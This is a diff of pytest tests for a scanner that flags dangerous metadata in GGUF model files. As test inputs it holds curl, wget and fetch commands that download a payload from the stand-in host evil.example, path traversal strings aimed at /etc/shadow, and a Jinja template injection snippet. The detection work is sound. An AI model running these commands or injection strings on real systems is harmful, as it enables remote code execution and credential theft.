@@ -1144,19 +1144,25 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("loader", "subprocess.run(['id'])", "command_execution"),
         ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
         ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
+        ("encoded_payload", "..%25252Fetc%25252Fshadow", "path_traversal"),
         ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --url https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --connect-timeout 5 https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
+        ("download", 'url=https://evil.example/payload.sh; curl "$url"', "remote_fetch"),
+        ("download", "payload_url='https://evil.example/payload.sh'; wget ${payload_url}", "remote_fetch"),
+        ("download", "```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
         ("download", "/usr/bin/curl https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -H 'Authorization: Bearer token' https://evil.example/payload.sh", "remote_fetch"),
         ("loader", "/bin/bash -c 'curl https://evil.example/payload.sh'", "command_execution"),
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
         ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
+        ("callback", "window.fetch('https://evil.example/payload')", "remote_fetch"),
     ],
 )
 def test_gguf_metadata_value_requires_concrete_security_evidence(
@@ -1183,20 +1189,61 @@ def test_gguf_metadata_fetch_command_words_in_prose_are_not_remote_fetch() -> No
     assert evidence == []
 
 
+@pytest.mark.parametrize(
+    "value",
+    [
+        "the prefetch('https://huggingface.co/docs') example is documentation",
+        "url=https://huggingface.co/org/model; curl examples are listed below",
+        "url=https://huggingface.co/org/model; curl url",
+        "url=https://huggingface.co/org/model; curl $url_suffix",
+        "author\x00metadata https://huggingface.co/org/model",
+        "Authorization: Bearer token\nX-Repo: https://huggingface.co/org/model",
+        ("Model card usage example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/model.gguf\n```\n"),
+        (
+            "Repository instructions:\n"
+            "```python\n"
+            "requests.get('https://huggingface.co/org/model/raw/main/README.md')\n"
+            "```\n"
+        ),
+    ],
+)
+def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "curl --connect-timeout 'https://evil.example/payload.sh'",
+        "curl -H 'https://evil.example/header'",
+        "curl --header=https://evil.example/header",
+    ],
+)
+def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("download", value)
+
+    assert evidence == []
+
+
 def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_quickly() -> None:
     malicious = "curl " + "-! " * 20_000 + "https://evil.example/payload.sh"
     benign = ("repository/name | tokenizer/path; " * 20_000) + "https://huggingface.co/org/model"
     benign_urls = " ".join(["https://huggingface.co/org/model"] * 20_000)
+    repeated_api_tokens = "https://huggingface.co/org/model " + "fetch(nope) " * 20_000
 
     start = time.perf_counter()
     malicious_evidence = GgufScanner._metadata_value_security_evidence("download", malicious)
     benign_evidence = GgufScanner._metadata_value_security_evidence("description", benign)
     benign_url_evidence = GgufScanner._metadata_value_security_evidence("description", benign_urls)
+    repeated_api_evidence = GgufScanner._metadata_value_security_evidence("description", repeated_api_tokens)
     elapsed = time.perf_counter() - start
 
     assert any(evidence["evidence_type"] == "remote_fetch" for evidence in malicious_evidence)
     assert benign_evidence == []
     assert benign_url_evidence == []
+    assert repeated_api_evidence == []
     assert elapsed < 1.0
 
 
@@ -1225,6 +1272,117 @@ def test_gguf_metadata_concrete_evidence_end_to_end_regressions(tmp_path: Path) 
     assert any(issue.rule_code == "S902" and "download" in issue.message for issue in malicious_aggregate.issues)
     assert not any(issue.rule_code == "S902" for issue in benign_aggregate.issues)
     assert determine_exit_code(benign_aggregate) == 0
+
+
+def test_gguf_metadata_value_check_details_are_bounded_for_giant_values(tmp_path: Path) -> None:
+    payload = "curl https://evil.example/payload.sh " + ("A" * 100_000)
+    path = create_mock_gguf(tmp_path / "giant-malicious-metadata.gguf", metadata={"download": payload})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert len(checks[0].details["value"]) == 200
+
+
+def test_gguf_metadata_value_checks_are_capped_for_repeated_nested_arrays(tmp_path: Path) -> None:
+    payload = b"".join(_encode_gguf_string(f"curl https://evil.example/payload-{index}.sh") for index in range(80))
+    path = tmp_path / "many-nested-malicious-values.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("download.array", 9, _encode_gguf_array(8, payload, 80))],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 64
+    assert result.metadata["metadata_value_security_checks_truncated"] is True
+
+
+def test_gguf_nested_metadata_array_strings_are_scanned_without_flagging_benign_urls(tmp_path: Path) -> None:
+    path = tmp_path / "nested-string-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "download.array",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("https://huggingface.co/org/model")
+                    + _encode_gguf_string("curl https://evil.example/payload.sh"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["value_path"] == "[1]"
+    assert checks[0].details["evidence_type"] == "remote_fetch"
+
+
+def test_gguf_tokenizer_vocabulary_array_strings_are_inert_metadata(tmp_path: Path) -> None:
+    path = tmp_path / "tokenizer-vocabulary-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.tokens",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("curl https://evil.example/payload.sh")
+                    + _encode_gguf_string("{{ ''.__class__.__mro__[1].__subclasses__() }}"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+
+
+def test_gguf_malformed_utf8_metadata_fails_closed(tmp_path: Path) -> None:
+    path = tmp_path / "malformed-utf8-metadata.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("general.description", 8, struct.pack("<Q", 8) + b"\xff\xfe\xfa\x00safe")],
+    )
+
+    result = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert GGUF_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert _failed_metadata_value_checks(result) == []
+    _assert_inconclusive_exit2(aggregate, GGUF_PARSE_INCONCLUSIVE_REASON)
+
+
+def test_gguf_malformed_utf8_metadata_with_prior_malicious_value_preserves_finding(tmp_path: Path) -> None:
+    path = tmp_path / "malformed-utf8-after-malicious-metadata.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            ("download", 8, _encode_gguf_string("curl https://evil.example/payload.sh")),
+            ("general.description", 8, struct.pack("<Q", 8) + b"\xff\xfe\xfa\x00safe"),
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in _failed_metadata_value_checks(result))
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in aggregate.issues)
+    assert determine_exit_code(aggregate) == 2
 
 
 def test_gguf_chat_template_command_payload_still_uses_jinja_analysis(tmp_path: Path) -> None:
